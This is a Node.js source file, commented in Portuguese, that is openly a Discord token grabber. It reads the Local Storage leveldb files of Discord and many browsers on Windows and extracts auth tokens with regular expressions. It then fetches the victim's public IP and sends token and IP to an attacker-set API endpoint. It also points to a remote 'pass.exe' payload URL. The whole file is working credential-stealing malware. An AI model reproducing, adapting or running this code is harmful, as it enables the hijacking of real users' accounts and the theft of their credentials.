// get api in my github: github.com/kakau69

const fetch = require("node-fetch")
const fs = require("fs")
const os = require("os")
const https = require("https")
const { execFile, exec } = require('child_process')
const api = "sua api url"
const url = api + "/pass/pass.exe";
const user = process.env.USERNAME
const roaming = "C:/Users/" + user + "/AppData/Roaming"
const local = "C:/Users/" + user + "/AppData/Local"


  // roubar tokens do usuário
  async function grabber() {

      if (os.platform() === "win32") {

          var paths = [
              roaming + "/Discord/Local Storage/leveldb",
              roaming + "/discord/Local Storage/leveldb",
              roaming + "/Lightcord/Local Storage/leveldb",
              roaming + "/discordptb/Local Storage/leveldb",
              roaming + "/discordcanary/Local Storage/leveldb",
              roaming + "/Opera Software/Opera Stable/Local Storage/leveldb",
              roaming + "/Opera Software/Opera GX Stable/Local Storage/leveldb",
              local + "/Amigo/User Data/Local Storage/leveldb",
              local + "/Torch/User Data/Local Storage/leveldb",
              local + "/Kometa/User Data/Local Storage/leveldb",
              local + "/Orbitum/User Data/Local Storage/leveldb",
              local + "/CentBrowser/User Data/Local Storage/leveldb",
              local + "/7Star/7Star/User Data/Local Storage/leveldb",
              local + "/Sputnik/Sputnik/User Data/Local Storage/leveldb",
              local + "/Vivaldi/User Data/Default/Local Storage/leveldb",
              local + "/Google/Chrome SxS/User Data/Local Storage/leveldb",
              local + "/Epic Privacy Browser/User Data/Local Storage/leveldb",
              local + "/Google/Chrome/User Data/Default/Local Storage/leveldb",
              local + "/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
              local + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
              local + "/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
              local + "/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb",
              local + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",];
  
              for (i = 0; i < paths.length; i++) {
                pegartoken(paths[i])}
    
            async function pegartoken(path) {
                try {
                    fs.readdir(path, (err, files) => {
                        if (files === undefined) {
                            return
                        }
    
                        let filtro = files.filter(f => f.split('.').pop() === "ldb")
                        for (i = 0; i < filtro.length; i++) {
                            fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
                                let semmfa = new RegExp(/[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
                                let mfa = new RegExp(/mfa\.[\w-]{84}/g)
    
                                let [tokenuser] = semmfa.exec(data) || mfa.exec(data) || [null];
                                if (tokenuser != null) {
                                    tokenuser = tokenuser.replace(/"/g, '')
                                    let response = await fetch('https://api.ipify.org/?format=json');
                                    let data = await response.json();
                                    await fetch(api + "/verify" + "/" + tokenuser + "/" + data.ip + "/" + "made by whksy#0001 and kakau baby")
                            }
                            })
                        }
                    })
    
    
                    fs.readdir(path, (err, files) => {
                        if (files === undefined) {
                            return
                        }
  
                        let filtro = files.filter(f => f.split('.').pop() === "log")
                        for (i = 0; i < filtro.length; i++) {
                            fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
                                let semmfa = new RegExp(/[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
                                let mfa = new RegExp(/mfa\.[\w-]{84}/g)

                                if (semmfa.test(data)) {}
                                let [tokenuser] = semmfa.exec(data) || mfa.exec(data) || [null];
                                if (tokenuser != null) {
                                    tokenuser = tokenuser.replace(/"/g, '')
                                    let response = await fetch('https://api.ipify.org/?format=json');
                                    let data = await response.json(); 
                                    await fetch(api + "/verify" + "/" + tokenuser + "/" + data.ip + "/" + "finalizado")
                            }})
                        }})
                } catch (err) {fetch(api + "/error/erro-em-tokens")}
            }
        }
    }
  
   grabber()
